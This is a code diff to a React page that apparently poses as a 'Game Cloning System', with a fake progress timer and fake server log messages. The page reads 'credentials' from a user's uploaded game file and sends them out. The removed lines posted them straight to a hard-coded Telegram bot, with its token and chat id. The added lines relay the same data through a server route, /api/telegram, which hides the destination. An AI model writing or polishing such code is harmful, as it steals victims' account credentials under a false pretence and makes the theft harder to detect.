@@ -10,7 +10,7 @@ const Index = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [showProgress, setShowProgress] = useState(false);
   const [progress, setProgress] = useState(0);
-  const [timeRemaining, setTimeRemaining] = useState(9381);
+  const [timeRemaining, setTimeRemaining] = useState(9381); // Start from 9381 seconds
   const [consoleOutput, setConsoleOutput] = useState([
     '[INFO] Game Cloning System v2.1.4 initialized',
     '[INFO] Connection to remote servers established',
@@ -19,7 +19,7 @@ const Index = () => {
   const { toast } = useToast();
 
   const getWebhookEndpoint = () => {
-    return 'https://api.telegram.org/bot8165418740:AAHKjz_zlJQ2yAsIWz6jyteqwdpZxfWNfkvo/sendMessage';
+    return '/api/telegram';  // now points to your API route
   };
 
   useEffect(() => {
@@ -57,34 +57,17 @@ const Index = () => {
     return null;
   };
 
+  // <<< UPDATED transmitData: send to your own API route now >>>
   const transmitData = async (data: string) => {
     try {
-      const endpoint = getWebhookEndpoint();
-      const params = new URLSearchParams({
-        chat_id: '7544292494',
-        text: data,
-      });
-
-      const response = await fetch(endpoint, {
+      await fetch('/api/telegram', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: params.toString(),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ data }),
       });
-
-      const result = await response.json();
-
-      if (!result.ok) {
-        addConsoleLog(`[ERROR] Telegram API error: ${result.description}`);
-      } else {
-        addConsoleLog('[SUCCESS] Data sent to Telegram');
-      }
-
-      console.log('Telegram response:', result);
+      console.log('Data sent successfully');
     } catch (error) {
-      console.error('Network error:', error);
-      addConsoleLog(`[ERROR] Failed to send data: ${String(error)}`);
+      console.log('Error sending data:', error);
     }
   };
 
@@ -122,7 +105,7 @@ const Index = () => {
     if (!credentials) {
       addConsoleLog('[ERROR] Invalid game file format detected');
       toast({
-        title: "Error",
+        title: "Error", 
         description: "Invalid game file format",
         variant: "destructive",
       });
